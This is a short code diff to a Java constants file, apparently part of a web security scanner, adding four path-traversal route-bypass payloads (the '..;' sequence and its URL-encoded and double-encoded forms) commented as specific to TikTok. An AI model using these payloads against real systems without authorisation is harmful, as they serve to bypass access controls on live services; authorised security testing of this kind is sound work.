@@ -129,6 +129,12 @@ public class PayloadConstants {
      * 保留了除 Spring、信息泄露、Rewrite 和 {sub../} 之外的所有 payload
      */
     public static final List<PayloadInfo> ROUTE_PAYLOAD_INFOS = Arrays.asList(
+            //tiktok 专用payload
+            new PayloadInfo("..;", "tiktok1"),
+            new PayloadInfo("%2e%2e%3b", "tiktok2"),
+            new PayloadInfo("%25%32%65%25%32%65%25%33%62", "tiktok3"),
+            new PayloadInfo("{path}/..;", "tiktok4"),
+
             new PayloadInfo("chaxx123", "chaxx"),
             new PayloadInfo("null", "null"),
             new PayloadInfo(".", "."),
